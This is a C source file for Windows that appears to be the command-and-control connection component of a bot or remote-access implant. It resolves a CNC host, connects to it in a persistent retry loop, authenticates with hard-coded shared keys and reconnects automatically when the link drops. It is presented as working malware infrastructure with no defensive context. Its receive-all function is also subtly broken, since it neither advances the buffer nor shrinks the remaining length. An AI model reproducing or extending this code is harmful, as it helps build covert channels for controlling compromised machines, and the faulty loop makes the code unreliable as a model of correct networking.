#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "cnc.h"
#include "utils.h"
#include "logger.h"
#include "return_codes.h"

SOCKET cnc_sock = INVALID_SOCKET;
char *cnc_host = NULL;

void init_winsock()
{
    WSADATA wsaData = {};
    int ret = 0;

    if ((ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
        fatal_error("WSAStartup failed: %d", ret);
    log_debug("Initialized Winsock.");
}

void get_cnc_addrinfo(struct addrinfo **result)
{
    char cnc_addr[255];
    long unsigned int cnc_addr_len = sizeof(cnc_addr);
    struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};

    if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
        fatal_error("getaddrinfo failed: %d", WSAGetLastError());

    cnc_addrinfo = *result;
    WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
    log_debug("CNC's address: %s", cnc_addr);
}

void init_cnc_sock()
{
    cnc_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (cnc_sock == INVALID_SOCKET)
        fatal_error("Error at socket(): %ld", WSAGetLastError());
}

void auth_cnc()
{
    int byte_count = 0;
    char received_auth_key[AUTH_KEY_LEN];

    log_info("Authenticating with CNC.");
    byte_count = send_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN)
        fatal_error("Failed to send authentication key to CNC.");

    byte_count = recv_cnc(received_auth_key, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN || memcmp(received_auth_key, AUTH_KEY_FROM_CNC, AUTH_KEY_LEN))
        fatal_error("Received invalid authentication key from CNC.");
}

void connect_cnc(struct addrinfo *cnc_addrinfo)
{
    int ret = 0;

    while (TRUE)
    {
        if (connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen) == SOCKET_ERROR)
        {
            if ((ret = WSAGetLastError()) != WSAECONNREFUSED)
                fatal_error("Error at connect(): %ld", ret);
            else
            {
                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
                Sleep(SLEEP_INTERVAL_ON_CONNREFUSED_MS);
            }
        }
        else
        {
            auth_cnc();
            log_info("Connected to CNC.");
            return;
        }
    }
}

void reconnect_cnc()
{
    struct addrinfo *cnc_addrinfo = NULL;

    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_cnc(cnc_addrinfo);
}

int send_cnc(void *buf, size_t len)
{
    int bytes_sent = 0;

    bytes_sent = send(cnc_sock, buf, len, 0);
    if (bytes_sent == SOCKET_ERROR)
        fatal_error("Error at send(): %ld", WSAGetLastError());

    return bytes_sent;
}

int recv_cnc(void *buf, size_t len)
{
    int bytes_read = 0;

    bytes_read = recv(cnc_sock, buf, len, 0);
    if (bytes_read == SOCKET_ERROR)
        fatal_error("Error at recv(): %ld", WSAGetLastError());
    if (bytes_read == 0)
    {
        log_error("Connection with CNC broke.");
        reconnect_cnc();
        return E_CONNECTION_CLOSED;
    }
    return bytes_read;
}

int recvall_cnc(void *buf, size_t len)
{
    int bytes_read = 0;
    size_t total_bytes_read = 0;

    while (total_bytes_read != len)
    {
        if ((bytes_read = recv_cnc(buf, len)) == E_CONNECTION_CLOSED)
            return E_CONNECTION_CLOSED;

        total_bytes_read += bytes_read;
    }
    return total_bytes_read;
}

void init_cnc_conn(char *host)
{
    struct addrinfo *cnc_addrinfo = NULL;

    cnc_host = host;
    init_winsock();
    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_cnc(cnc_addrinfo);
}
